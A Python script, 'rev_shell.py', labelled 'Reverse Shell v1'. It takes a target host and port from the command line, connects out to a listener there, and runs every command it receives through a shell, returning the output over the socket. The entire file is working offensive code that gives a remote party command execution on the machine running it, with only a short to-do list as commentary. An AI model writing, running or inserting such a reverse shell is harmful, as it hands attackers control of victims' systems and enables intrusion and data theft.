#!/usr/bin/env python3
import subprocess
import socket
import argparse
import errno
import sys

""" Reverse Shell v1 """
""" Establishes a simple reverse shell connection """
""" Does not support commands like cd, alias, etc. """

# To-Do:
# [ ] Add input handling stability for built-in shell commands
# [ ] Add persistent cwd tracking


# Arguments
def get_args():
    parser = argparse.ArgumentParser(
        prog="rev_shell.py",
        usage="%(prog)s [options]",
        add_help=True,
        allow_abbrev=True,
    )

    # Define arguments (don't set default if arg is required, leave in for debugging)
    group = parser.add_mutually_exclusive_group(required=False)
    parser.add_argument("-i", "--interface", required=False, type=str.lower, default="wlan0", metavar="", help="specify target interface (default: wlan0)")
    parser.add_argument("-t", "--target", required=True, type=str.lower, metavar="", help="specify target host")
    parser.add_argument("-p", "--port", required=True, type=int, metavar="", help="specify target port")

    return parser.parse_args(), parser

# Display help message / options
def get_help(parser):
    parser.print_help()
    sys.exit(1)                 # Exit with an error code

# Connect to listener
def connect(target, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target, port))
        session(s)
    except socket.error as e:
        if e.errno == errno.ECONNREFUSED:
            print("[-] Connection refused")
        elif e.errno == errno.EADDRINUSE:
            print("[-] Port already in use")
        else:
            print(f"A general socket error occurred: {e}")

# Once session is established
def session(s):
    try:
        s.send(b"[+] Session established\n") # Debug
        while True:
            #command = input("> ")
            command = s.recv(4096).decode().strip()
            if command.lower() == "exit":
                break
            prochandle = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            results, errors = prochandle.communicate()
            results += errors
            print(f"{command}: {results.decode()}")
            s.send(results)
    except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
        print("Client disconnected or connection error occurred.")
    except Exception as e:
        print(f"An general connection error occurred: {e}")
    finally:
        s.close()
        print("Session closed.")


def main():
    args, parser = get_args()   # args = Defined arguments specified by user, parser = script settings

    # Only useful if no arguments are required
    #if len(sys.argv) == 1:      # If no other arguments are specified (program name counts as 1 argument)
    #    get_help(parser)
    #    print("[+] No arguments specified, using default values.\n\n")

    connect(args.target, args.port) # Script remains in connect() and session() until closed

if __name__ == "__main__":
    main()
